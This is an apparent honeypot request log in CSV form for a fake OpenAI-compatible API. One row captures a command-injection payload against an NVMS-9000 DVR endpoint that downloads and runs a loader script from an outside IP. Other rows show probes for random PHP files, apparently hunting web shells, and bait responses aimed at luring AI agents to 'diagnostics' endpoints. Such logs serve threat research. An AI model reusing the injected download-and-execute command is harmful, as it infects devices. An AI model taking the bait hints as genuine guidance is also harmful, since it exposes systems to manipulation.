request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
639f9122-8a8e-49dd-b8d2-562ca1c00e34,2026-04-12T06:19:37.455524+00:00,anon_c6492a01,POST,/ISAPI/System/time/ntpServers,[honeypot-host],Mozilla/5.0,,444,316,1,,"<?xml version=""1.0"" encoding=""utf-8""?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode></types><content><switch><enabled>true</enabled></switch><filterType><filterTypeMode>refuse</filterTypeMode></filterType><ntpServer><host>`cd /tmp;wget http://103.106.229.247/loader.sh -O .dvr;chmod 777 .dvr;./.dvr dvr;rm .dvr`</host></ntpServer></content></request>","<?xml version=""1.0"" encoding=""utf-8""?><request version=""1.0"" systemType=""NVMS-9000"" clientType=""WEB""><types><filterTypeMode><enum>refuse</enum><enum>allow</enum></filterTypeMode></types><content><switch><enabled>true</enabled></switch><filterType><filterTypeMode>refuse</filterTypeMode></filterType><ntpServer><host>`cd /tmp;wget http://103.106.229.247/loader.sh -O .dvr;chmod 777 .dvr;./.dvr dvr;rm .dvr`</host></ntpServer></content></request>",404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
136883e8-2fb5-49b0-9569-fa95024ed3f0,2026-04-12T06:19:37.703244+00:00,anon_c6492a01,GET,/,[honeypot-host],Mozilla/5.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
1a5e43ce-adc1-4162-b28a-0701fc56cd79,2026-04-12T06:19:37.907307+00:00,anon_c6492a01,GET,/,[honeypot-host],Mozilla/5.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
513dd728-7191-4557-81dc-2ab2c03a3265,2026-04-12T06:19:38.555077+00:00,anon_c6492a01,GET,/,[honeypot-host],Mozilla/5.0,,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
250df805-8577-48dd-85fe-f81f5157d305,2026-04-12T06:23:07.895888+00:00,anon_6fa93dff,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/),,0,520,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest"", ""tool-preview"", ""developer-diagnostics-preview""], ""plugin_manifest"": ""/.well-known/ai-plugin.json"", ""agent_manifest"": ""/.well-known/agent.json"", ""notes"": [""debug preview available"", ""restricted context may be attached to some responses"", ""developer diagnostics partially enabled""]}
",0,
e2edb038-c798-4abc-bb44-6c65fee40d84,2026-04-12T06:29:18.312197+00:00,anon_1c3fa965,GET,/wp-content/plugins/hellopress/wp_filemanager.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",1,
288a3ba6-8311-42b4-98ef-96705577652c,2026-04-12T06:29:18.887127+00:00,anon_1c3fa965,GET,/tymi.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
10f4c5ad-a327-4cd0-8115-588814af96a4,2026-04-12T06:29:19.376909+00:00,anon_1c3fa965,GET,/4GrJSiwkF3A.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
7d63caf2-14e0-4d3a-84a0-38e8705ae67d,2026-04-12T06:29:20.133069+00:00,anon_1c3fa965,GET,/SS72_kKKjT.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
8461a59b-4013-4155-a405-9c9dd19fa523,2026-04-12T06:29:20.655163+00:00,anon_1c3fa965,GET,/wkogn.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
e04085e6-9835-459f-9474-36cb96787b60,2026-04-12T06:29:21.297515+00:00,anon_1c3fa965,GET,/hwjtry0zd1fzeakcuzn8Cdefault.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
abf97702-a263-4368-9f92-3f1e6781478f,2026-04-12T06:29:21.996944+00:00,anon_1c3fa965,GET,/cilus.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
80fd32b2-63bd-413d-8fff-81ec6bf19201,2026-04-12T06:29:22.742402+00:00,anon_1c3fa965,GET,/oLEzRVqmJJPFSucdefault.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
cc628997-3c2a-492e-b00c-3008a368c97e,2026-04-12T06:29:23.883307+00:00,anon_1c3fa965,GET,/wwdgl.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c2d31351-1308-474e-be58-d22b179c8dc1,2026-04-12T06:29:24.927059+00:00,anon_1c3fa965,GET,/3akp.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
c35eb1ba-c63c-46b1-83fa-63e5cc6a23cd,2026-04-12T06:29:26.102475+00:00,anon_1c3fa965,GET,/HLA-dd.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
44121aa3-3860-4138-907e-5d909d41f97d,2026-04-12T06:29:27.633540+00:00,anon_1c3fa965,GET,/BhqKs28Cw94.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
6cf8b9f3-b731-44b3-bb72-ba6edf1f64e7,2026-04-12T06:29:28.716273+00:00,anon_1c3fa965,GET,/cdn3.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
61e67adc-54a4-4d04-afd4-6b4e6514f731,2026-04-12T06:29:29.699906+00:00,anon_1c3fa965,GET,/3Cr1w6dfjTK.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
ec1c03a9-e4a8-4cbb-9a8b-16271f9d69ce,2026-04-12T06:29:31.683361+00:00,anon_1c3fa965,GET,/beerd.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
3d487093-98cb-4d44-9ab8-b6475353168a,2026-04-12T06:29:32.648315+00:00,anon_1c3fa965,GET,/hhxc.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
bf4cf3a5-1816-4207-9e03-dbf53d668d0b,2026-04-12T06:29:33.550619+00:00,anon_1c3fa965,GET,/161dfd072f.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
9658b2f9-5bb9-4f1e-8007-0cf986c105e8,2026-04-12T06:29:34.465086+00:00,anon_1c3fa965,GET,/ws80.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
ee1d1eac-a255-4e4b-9898-ec5224d4d140,2026-04-12T06:29:35.268218+00:00,anon_1c3fa965,GET,/ylzed0twj8l9drdbchc1oocfCdefault.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
6d6acd37-69c5-497a-b7d3-7336faccb01d,2026-04-12T06:29:35.891067+00:00,anon_1c3fa965,GET,/RIP.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a3aefd33-b8c7-40b3-807f-6c97a94cba3a,2026-04-12T06:29:36.523495+00:00,anon_1c3fa965,GET,/no18.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
99e8dc71-66f5-495c-ae9c-367f6de9a2b7,2026-04-12T06:29:37.100976+00:00,anon_1c3fa965,GET,/blqjs.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
6617cc25-70c8-4f1d-a5da-80ac82a1083c,2026-04-12T06:29:37.883009+00:00,anon_1c3fa965,GET,/sk25_1.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f85b2a3a-79e8-4f85-aa04-77d29ea9f7d9,2026-04-12T06:29:39.256833+00:00,anon_1c3fa965,GET,/fetch.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
f6d8aba1-2c67-434c-856d-bee4de1ecfdc,2026-04-12T06:29:40.043488+00:00,anon_1c3fa965,GET,/eFpU3yHnriNNLtvdefault.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
3ea7e7b4-a858-49a9-9ea0-ea0351a27296,2026-04-12T06:29:40.677452+00:00,anon_1c3fa965,GET,/2nzyHnOkEg.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
15a838af-78f6-436b-bd22-3b1d145dd63d,2026-04-12T06:29:41.345274+00:00,anon_1c3fa965,GET,/oircv.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
d39a1438-668a-47ef-91fd-c35913191fba,2026-04-12T06:29:42.123276+00:00,anon_1c3fa965,GET,/blnux.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
a4310436-705f-4c73-ba76-aa4b2076799c,2026-04-12T06:29:42.764695+00:00,anon_1c3fa965,GET,/n3yUmQ6Q9xwQ8ocdefault.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
369dd180-b3f6-403e-ad4e-7049425903ea,2026-04-12T06:29:43.566609+00:00,anon_1c3fa965,GET,/Spow_SRw.php,[honeypot-host],,,0,316,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /v1/chat/completions or POST /v1/responses for interactive model access."", ""hint"": ""Developer preview clients may inspect /v1/files and /.well-known/ai-plugin.json first, then use /v1/responses or /v1/chat/completions to request diagnostics or visible guidance.""}",0,
